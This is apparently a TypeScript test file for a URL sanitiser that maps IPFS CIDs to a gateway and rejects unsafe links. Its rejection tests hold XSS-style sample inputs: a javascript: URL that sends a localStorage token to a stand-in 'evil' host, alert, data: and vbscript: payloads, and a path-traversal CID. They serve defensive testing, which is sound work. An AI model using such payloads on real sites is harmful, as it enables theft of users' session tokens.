import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { toSafeProofUrl, DEFAULT_IPFS_GATEWAY } from './proof-url.ts';

const CID_V0 = 'QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG';
const CID_V1 = 'bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi';

describe('toSafeProofUrl', () => {
  it('maps ipfs:// URIs to the gateway', () => {
    assert.equal(toSafeProofUrl(`ipfs://${CID_V0}`), `${DEFAULT_IPFS_GATEWAY}${CID_V0}`);
    assert.equal(toSafeProofUrl(`ipfs://${CID_V1}`), `${DEFAULT_IPFS_GATEWAY}${CID_V1}`);
  });

  it('keeps a path after the CID in ipfs:// URIs', () => {
    assert.equal(
      toSafeProofUrl(`ipfs://${CID_V1}/invoice.pdf`),
      `${DEFAULT_IPFS_GATEWAY}${CID_V1}/invoice.pdf`,
    );
  });

  it('maps bare CIDs to the gateway', () => {
    assert.equal(toSafeProofUrl(CID_V0), `${DEFAULT_IPFS_GATEWAY}${CID_V0}`);
    assert.equal(toSafeProofUrl(CID_V1), `${DEFAULT_IPFS_GATEWAY}${CID_V1}`);
  });

  it('uses a custom gateway, with or without a trailing slash', () => {
    assert.equal(
      toSafeProofUrl(CID_V0, 'https://gateway.example.com/ipfs'),
      `https://gateway.example.com/ipfs/${CID_V0}`,
    );
    assert.equal(
      toSafeProofUrl(`ipfs://${CID_V0}`, 'https://gateway.example.com/ipfs/'),
      `https://gateway.example.com/ipfs/${CID_V0}`,
    );
  });

  it('keeps https URLs', () => {
    assert.equal(
      toSafeProofUrl('https://example.com/proof.pdf'),
      'https://example.com/proof.pdf',
    );
  });

  it('rejects javascript:, data: and vbscript: URLs', () => {
    assert.equal(toSafeProofUrl("javascript:fetch('//evil?'+localStorage.chainsetttle_token)"), null);
    assert.equal(toSafeProofUrl('JavaScript:alert(1)'), null);
    assert.equal(toSafeProofUrl('  javascript:alert(1)'), null);
    assert.equal(toSafeProofUrl('java\tscript:alert(1)'), null);
    assert.equal(toSafeProofUrl('data:text/html,<script>alert(1)</script>'), null);
    assert.equal(toSafeProofUrl('vbscript:msgbox(1)'), null);
  });

  it('rejects http URLs', () => {
    assert.equal(toSafeProofUrl('http://example.com/proof.pdf'), null);
  });

  it('rejects malformed ipfs:// URIs', () => {
    assert.equal(toSafeProofUrl('ipfs://'), null);
    assert.equal(toSafeProofUrl('ipfs://not-a-cid'), null);
    assert.equal(toSafeProofUrl(`ipfs://${CID_V0}/../evil`), null);
    assert.equal(toSafeProofUrl(`ipfs://${CID_V0}?x=javascript:alert(1)`), null);
  });

  it('rejects empty and free-text values', () => {
    assert.equal(toSafeProofUrl(''), null);
    assert.equal(toSafeProofUrl('   '), null);
    assert.equal(toSafeProofUrl('delivered to warehouse 4'), null);
    assert.equal(toSafeProofUrl('0xabc123'), null);
  });
});
